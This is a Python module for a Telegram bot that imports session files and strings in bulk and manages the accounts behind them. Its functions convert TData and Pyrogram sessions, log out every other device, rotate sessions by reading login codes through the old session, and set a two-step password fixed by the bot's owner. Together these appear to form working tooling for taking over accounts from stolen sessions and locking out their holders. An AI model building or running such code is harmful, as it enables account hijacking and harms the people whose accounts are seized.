"""
نظام جلسات متطور للبوت
يدعم: StringSession, JSON, SQLite, Hex+DC, TData
مع أمان كامل وتدوير تلقائي
"""

import asyncio
import base64
import json
import struct
import socket
import os
from typing import Optional, Tuple, Dict, Any
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    FloodWaitError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    PhoneNumberInvalidError, SessionPasswordNeededError,
    PasswordHashInvalidError, AuthKeyUnregisteredError,
    AuthKeyDuplicatedError, SessionRevokedError,
    UserDeactivatedError, AccountBannedError
)
from telethon.tl.functions.account import (
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    ResetAuthorizationsRequest,
    GetPasswordRequest,
    CheckPasswordRequest
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest as AuthResetRequest
from telethon.password import compute_check
from config import API_ID, API_HASH, OWNER_FIXED_2FA_PASSWORD
import database
import logging

logger = logging.getLogger(__name__)

# ==================== الثوابت ====================
_TG_DC = {
    1: ("149.154.175.53", 443),
    2: ("149.154.167.51", 443),
    3: ("149.154.175.100", 443),
    4: ("149.154.167.91", 443),
    5: ("91.108.56.130", 443),
}

# ==================== أدوات التحويل ====================

def pyrogram_json_to_telethon(data: Dict[str, Any]) -> Optional[str]:
    """
    تحويل صيغة Pyrogram JSON إلى Telethon StringSession
    البيانات المتوقعة: {dc_id: int, auth_key: str (hex)}
    """
    try:
        dc_id = int(data.get("dc_id", 0))
        auth_hex = data.get("auth_key", "").strip()
        
        if not dc_id or not auth_hex:
            return None
            
        auth_key = bytes.fromhex(auth_hex)
        if len(auth_key) != 256:
            return None
            
        ip, port = _TG_DC.get(dc_id, ("149.154.167.51", 443))
        packed = struct.pack(
            ">B4sH256s",
            dc_id,
            socket.inet_aton(ip),
            port,
            auth_key
        )
        return "1" + base64.urlsafe_b64encode(packed).decode("ascii")
        
    except Exception as e:
        logger.error(f"تحويل Pyrogram فشل: {e}")
        return None

def tdata_to_telethon(tdata_path: str) -> Optional[str]:
    """
    تحويل مجلد TData (تيليجرام القديم) إلى StringSession
    يحتاج إلى ملفات: auth_key, dc_id, server_address, port
    """
    try:
        import sqlite3
        db_path = os.path.join(tdata_path, "usertoken")
        if not os.path.exists(db_path):
            # محاولة قراءة من ملفات JSON
            return _parse_tdata_json(tdata_path)
            
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # قراءة بيانات الجلسة
        cursor.execute("SELECT dc_id, auth_key, server_address, port FROM sessions LIMIT 1")
        row = cursor.fetchone()
        conn.close()
        
        if not row:
            return None
            
        dc_id, auth_key, server_addr, port = row
        if len(auth_key) != 256:
            return None
            
        packed = struct.pack(
            ">B4sH256s",
            dc_id,
            socket.inet_aton(server_addr),
            port,
            auth_key
        )
        return "1" + base64.urlsafe_b64encode(packed).decode("ascii")
        
    except Exception as e:
        logger.error(f"تحويل TData فشل: {e}")
        return None

def _parse_tdata_json(path: str) -> Optional[str]:
    """محاولة قراءة TData من ملفات JSON"""
    try:
        config_path = os.path.join(path, "config.json")
        if not os.path.exists(config_path):
            return None
            
        with open(config_path, "r") as f:
            data = json.load(f)
            
        dc_id = data.get("dc_id", 0)
        auth_key_hex = data.get("auth_key", "")
        
        if not auth_key_hex:
            return None
            
        return pyrogram_json_to_telethon({
            "dc_id": dc_id,
            "auth_key": auth_key_hex
        })
        
    except Exception:
        return None

def parse_session_string(session_input: Any) -> Optional[str]:
    """
    دالة شاملة لتحويل أي صيغة جلسة إلى StringSession
    يدعم: JSON, Dict, String, Base64, Hex+DC
    """
    if isinstance(session_input, str):
        # محاولة تحليل JSON
        if session_input.strip().startswith("{"):
            try:
                data = json.loads(session_input)
                return parse_session_string(data)
            except:
                pass
                
        # محاولة فك Base64
        try:
            decoded = base64.b64decode(session_input)
            return decoded.decode("utf-8")
        except:
            pass
            
        # صيغة Hex:DC
        if ":" in session_input and len(session_input.split(":")) == 2:
            hex_part, dc_part = session_input.split(":")
            if len(hex_part) == 512 and dc_part.isdigit():
                return pyrogram_json_to_telethon({
                    "dc_id": int(dc_part),
                    "auth_key": hex_part
                })
                
        # جلسة نصية عادية
        if len(session_input) > 10:
            return session_input
            
    elif isinstance(session_input, dict):
        # Pyrogram JSON
        if "dc_id" in session_input and "auth_key" in session_input:
            return pyrogram_json_to_telethon(session_input)
            
        # محاولة استخراج session_string
        for key in ["session_string", "session", "string_session"]:
            if key in session_input:
                return parse_session_string(session_input[key])
                
    return None

# ==================== دوال الجلسات الأساسية ====================

def run_async(coro):
    """تشغيل دالة غير متزامنة في بيئة متزامنة"""
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

async def test_session(session_string: str) -> Tuple[bool, Optional[dict]]:
    """اختبار صلاحية الجلسة وجلب معلومات الحساب"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, {"error": "الجلسة غير مصرح بها"}
            
        me = await client.get_me()
        await client.disconnect()
        
        return True, {
            "id": me.id,
            "phone": me.phone,
            "username": me.username,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "is_bot": me.bot,
            "premium": getattr(me, "premium", False)
        }
        
    except Exception as e:
        return False, {"error": str(e)}

async def send_code_sync(phone: str) -> Tuple[bool, str, Optional[str]]:
    """
    إرسال كود التفعيل إلى رقم الهاتف
    يعيد: (نجاح, رسالة, phone_code_hash)
    """
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        result = await client.send_code_request(phone)
        await client.disconnect()
        
        return True, "✅ تم إرسال كود التفعيل", result.phone_code_hash
        
    except FloodWaitError as e:
        return False, f"⏳ انتظر {e.seconds} ثانية", None
    except PhoneNumberInvalidError:
        return False, "❌ رقم هاتف غير صحيح", None
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}", None

async def sign_in_sync(phone: str, code: str, phone_code_hash: str) -> Tuple[bool, str, Optional[str]]:
    """
    تسجيل الدخول باستخدام الكود
    يعيد: (نجاح, رسالة, session_string)
    """
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            # طلب كلمة مرور 2FA
            await client.disconnect()
            return False, "🔒 مطلوب كلمة مرور التحقق بخطوتين", "2FA_REQUIRED"
            
        session_string = client.session.save()
        await client.disconnect()
        
        return True, "✅ تم تسجيل الدخول بنجاح", session_string
        
    except PhoneCodeInvalidError:
        return False, "❌ كود غير صحيح", None
    except PhoneCodeExpiredError:
        return False, "❌ انتهت صلاحية الكود", None
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}", None

async def sign_in_with_2fa(session_string: str, password: str) -> Tuple[bool, str]:
    """تسجيل الدخول باستخدام كلمة مرور 2FA"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        await client.sign_in(password=password)
        new_session = client.session.save()
        await client.disconnect()
        
        return True, new_session
        
    except PasswordHashInvalidError:
        return False, "❌ كلمة مرور غير صحيحة"
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}"

# ==================== دوال الأمان والتدوير ====================

async def kick_all_sessions(session_string: str) -> Tuple[bool, str]:
    """طرد جميع الجلسات الأخرى من الحساب"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, "الجلسة غير مصرح بها"
            
        # طرد جميع الجلسات الأخرى
        await client(ResetAuthorizationsRequest())
        
        # التحقق من عدد الأجهزة المتبقية
        devices = await client(GetAuthorizationsRequest())
        device_count = len(devices.authorizations) if devices else 0
        
        await client.disconnect()
        
        return True, f"تم طرد جميع الجلسات (بقي {device_count} جهاز)"
        
    except Exception as e:
        return False, str(e)

async def rotate_session(session_string: str) -> Tuple[bool, str]:
    """
    تدوير الجلسة: إنشاء جلسة جديدة وإلغاء القديمة
    """
    try:
        # 1. الاتصال بالجلسة الحالية
        old_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await old_client.connect()
        
        if not await old_client.is_user_authorized():
            await old_client.disconnect()
            return False, "الجلسة الحالية غير صالحة"
            
        me = await old_client.get_me()
        phone = me.phone
        
        # 2. طلب كود جديد
        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await new_client.connect()
        
        sent = await new_client.send_code_request(phone)
        
        # 3. انتظار الكود من 777000 (نستقبله عبر الجلسة القديمة)
        code = await _wait_for_code(old_client, phone)
        
        if not code:
            await old_client.disconnect()
            await new_client.disconnect()
            return False, "لم يصل الكود خلال 30 ثانية"
            
        # 4. تسجيل الدخول بالجلسة الجديدة
        await new_client.sign_in(phone, code, phone_code_hash=sent.phone_code_hash)
        new_session = new_client.session.save()
        
        # 5. إلغاء الجلسة القديمة
        await old_client.log_out()
        
        await old_client.disconnect()
        await new_client.disconnect()
        
        return True, new_session
        
    except Exception as e:
        return False, str(e)

async def _wait_for_code(client, phone: str, timeout: int = 30) -> Optional[str]:
    """انتظار كود الدخول من 777000"""
    import re
    
    start_time = asyncio.get_event_loop().time()
    while asyncio.get_event_loop().time() - start_time < timeout:
        try:
            messages = await client.get_messages(777000, limit=5)
            for msg in messages:
                if msg.text and phone in msg.text:
                    match = re.search(r'(\d{5})', msg.text)
                    if match:
                        return match.group(1)
        except:
            pass
        await asyncio.sleep(1)
    return None

async def enable_2fa(session_string: str, password: str = None) -> Tuple[bool, str]:
    """
    تفعيل التحقق بخطوتين
    """
    if not password:
        password = OWNER_FIXED_2FA_PASSWORD or "محمد"
        
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, "الجلسة غير مصرح بها"
            
        # التحقق من وجود 2FA
        pwd_state = await client(GetPasswordRequest())
        
        if pwd_state.has_password:
            await client.disconnect()
            return False, "التحقق بخطوتين مفعل مسبقاً"
            
        # تفعيل 2FA
        await client.edit_2fa(
            new_password=password,
            hint="Auto"
        )
        
        await client.disconnect()
        return True, f"تم تفعيل التحقق بخطوتين بنجاح\n🔑 كلمة المرور: `{password}`"
        
    except Exception as e:
        return False, str(e)

async def change_2fa(session_string: str, old_password: str, new_password: str) -> Tuple[bool, str]:
    """تغيير كلمة مرور 2FA"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        await client.edit_2fa(
            current_password=old_password,
            new_password=new_password,
            hint="Auto"
        )
        
        await client.disconnect()
        return True, "تم تغيير كلمة المرور بنجاح"
        
    except Exception as e:
        return False, str(e)

async def remove_2fa(session_string: str, password: str) -> Tuple[bool, str]:
    """إزالة التحقق بخطوتين"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        await client.edit_2fa(
            current_password=password,
            new_password=""
        )
        
        await client.disconnect()
        return True, "تم إزالة التحقق بخطوتين"
        
    except Exception as e:
        return False, str(e)

# ==================== استيراد الجلسات ====================

async def import_session_file(file_path: str) -> Dict[str, Any]:
    """
    استيراد جلسة من ملف (يدعم: .session, .json, .txt)
    """
    try:
        with open(file_path, "rb") as f:
            file_bytes = f.read()
            
        file_name = os.path.basename(file_path)
        ext = os.path.splitext(file_name)[1].lower()
        
        if ext == ".session":
            # ملف SQLite
            return await _import_sqlite_session(file_bytes, file_name)
            
        elif ext in [".json", ".txt"]:
            # ملف JSON أو نص
            try:
                text = file_bytes.decode("utf-8")
                return await _import_text_session(text, file_name)
            except:
                pass
                
        return {"success": False, "error": "نوع الملف غير مدعوم"}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def _import_sqlite_session(data: bytes, filename: str) -> Dict[str, Any]:
    """استيراد جلسة SQLite"""
    try:
        import tempfile
        import sqlite3
        
        with tempfile.NamedTemporaryFile(suffix=".session", delete=False) as tf:
            tf.write(data)
            tf_path = tf.name
            
        conn = sqlite3.connect(tf_path)
        cursor = conn.cursor()
        
        # Telethon
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions LIMIT 1")
        row = cursor.fetchone()
        
        if row:
            dc_id, server_addr, port, auth_key = row
            if len(auth_key) == 256:
                session = parse_session_string({
                    "dc_id": dc_id,
                    "auth_key": auth_key.hex()
                })
                conn.close()
                os.unlink(tf_path)
                return await _verify_and_save_session(session, filename)
                
        # Pyrogram
        cursor.execute("SELECT dc_id, auth_key FROM sessions LIMIT 1")
        row = cursor.fetchone()
        
        if row:
            dc_id, auth_key = row
            if len(auth_key) == 256:
                session = parse_session_string({
                    "dc_id": dc_id,
                    "auth_key": auth_key.hex()
                })
                conn.close()
                os.unlink(tf_path)
                return await _verify_and_save_session(session, filename)
                
        conn.close()
        os.unlink(tf_path)
        return {"success": False, "error": "لم يتم العثور على بيانات جلسة صالحة"}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def _import_text_session(text: str, filename: str) -> Dict[str, Any]:
    """استيراد جلسة من نص"""
    try:
        session = parse_session_string(text)
        if not session:
            return {"success": False, "error": "صيغة جلسة غير صالحة"}
            
        return await _verify_and_save_session(session, filename)
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def _verify_and_save_session(session_string: str, filename: str) -> Dict[str, Any]:
    """التحقق من الجلسة وحفظها"""
    try:
        # اختبار الجلسة
        success, info = await test_session(session_string)
        
        if not success:
            return {"success": False, "error": info.get("error", "جلسة غير صالحة")}
            
        # حفظ الجلسة
        phone = info.get("phone")
        if not phone:
            return {"success": False, "error": "لم يتم العثور على رقم الهاتف"}
            
        # حفظ في قاعدة البيانات
        if database.add_account(phone, session_string):
            return {
                "success": True,
                "phone": phone,
                "info": info,
                "session": session_string
            }
        else:
            return {"success": False, "error": "فشل حفظ الجلسة في قاعدة البيانات"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}

# ==================== دوال مساعدة للبوت ====================

async def get_device_count(session_string: str) -> int:
    """الحصول على عدد الأجهزة المسجلة"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return -1
            
        devices = await client(GetAuthorizationsRequest())
        await client.disconnect()
        
        return len(devices.authorizations)
        
    except Exception:
        return -1

async def get_device_details(session_string: str) -> list:
    """الحصول على تفاصيل جميع الأجهزة"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return []
            
        result = await client(GetAuthorizationsRequest())
        devices = []
        
        for auth in result.authorizations:
            devices.append({
                "hash": auth.hash,
                "current": auth.current,
                "device": auth.device_model or "غير معروف",
                "app": auth.app_name or "غير معروف",
                "platform": auth.platform or "",
                "country": auth.country or "",
                "date_created": auth.date_created,
                "date_active": auth.date_active,
                "ip": getattr(auth, "ip", "")
            })
            
        await client.disconnect()
        return devices
        
    except Exception:
        return []

async def kick_device(session_string: str, device_hash: int) -> Tuple[bool, str]:
    """طرد جهاز معين"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, "الجلسة غير مصرح بها"
            
        await client(ResetAuthorizationRequest(hash=device_hash))
        await client.disconnect()
        
        return True, "تم طرد الجهاز بنجاح"
        
    except Exception as e:
        return False, str(e)

# ==================== استيراد دفعة واحدة ====================

async def import_sessions_batch(sessions_data: list) -> Dict[str, Any]:
    """
    استيراد دفعة من الجلسات
    sessions_data: قائمة من session_string أو dict
    """
    results = {
        "total": len(sessions_data),
        "success": [],
        "failed": []
    }
    
    for idx, data in enumerate(sessions_data):
        try:
            # تحويل الصيغة
            session = parse_session_string(data)
            if not session:
                results["failed"].append({
                    "index": idx,
                    "error": "صيغة غير صالحة"
                })
                continue
                
            # التحقق والحفظ
            result = await _verify_and_save_session(session, f"batch_{idx}")
            
            if result["success"]:
                results["success"].append({
                    "index": idx,
                    "phone": result["phone"]
                })
            else:
                results["failed"].append({
                    "index": idx,
                    "error": result.get("error", "فشل الاستيراد")
                })
                
        except Exception as e:
            results["failed"].append({
                "index": idx,
                "error": str(e)
            })
            
    return results
